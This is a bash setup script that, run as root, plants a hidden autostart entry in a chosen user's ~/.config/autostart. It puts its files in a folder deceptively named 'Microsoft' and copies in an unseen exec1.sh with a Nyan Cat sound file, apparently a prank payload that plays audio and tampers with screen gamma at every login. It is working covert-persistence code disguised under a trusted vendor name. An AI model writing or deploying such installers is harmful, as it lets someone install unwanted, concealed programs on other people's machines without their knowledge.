#!/bin/bash

if [ "$EUID" -ne 0 ]; then
    echo "Please run this script with sudo"
    exit
fi

goodOS="$(lsb_release -i | grep Ubuntu)"
if [ -z "$goodOS" ]; then
    echo "Sorry, this script does not work on $goodOS"
    exit
fi

xgamma -q
if [ $? -ne 0 ]; then
    echo "Error: xgamma command not found"
    echo "Trying to install..."
    sudo apt install x11-xserver-utils
else
    echo "Info: xgamma command found"
fi

aplay > /dev/null
if [ $? -ne 1 ]; then
    echo "Error: aplay command not found"
    echo "Exiting"
    exit
else
    echo "Info: aplay command found"
fi

#check original username
users=(/home/*)
userPath=""
if [ ${#users[@]} -gt 1 ]; then
    echo "Warning: you have several users on this machine. Which one would you prefer? :"
    i=0
    j=${#users[@]}
    while [ $i -lt $j ]; do
        index=$(( $i + 1))
        echo -n "${index}) "
        curUser=${users[${i}]}
        echo "$curUser "
        i=$(( $i + 1 ))
    done
    echo "$(($j + 1))) Exit"
    echo -n "Please enter number: "
    read ans
    if [ $ans -lt 1 ] || [ $ans -gt $(($j + 1)) ]; then
        echo "Incorrect number. Exiting."
        exit
    elif [ $ans -eq $(($j + 1)) ]; then
        echo "Exiting."
        exit
    else
        userPath=${users[$(( $ans - 1 ))]}
    fi   
else
    userPath=$users
fi

autostartPath="${userPath}/.config/autostart"

if ! [ -d $autostartPath ]; then
    echo "Sorry, we can not find some folders on your machine. Exiting."
    exit
fi

binPath="$autostartPath/Microsoft"
if ! [ -d $binPath ]; then
    mkdir $binPath
fi


echo "[Desktop Entry]
Type=Application
Exec=$binPath/exec1.sh $binPath
X-GNOME-Autostart-enabled=true
Terminal=false" > autoconfig.desktop

cp autoconfig.desktop $autostartPath
cp exec1.sh $binPath
cp NyanCat.wav $binPath
chmod +x $binPath/exec1.sh
chmod +x $binPath/NyanCat.wav

echo -n "Setup ended. Reboot now? : "
read x
if [ $x = "y" ]; then
    reboot
else
    echo "Reboot cancelled."
fi
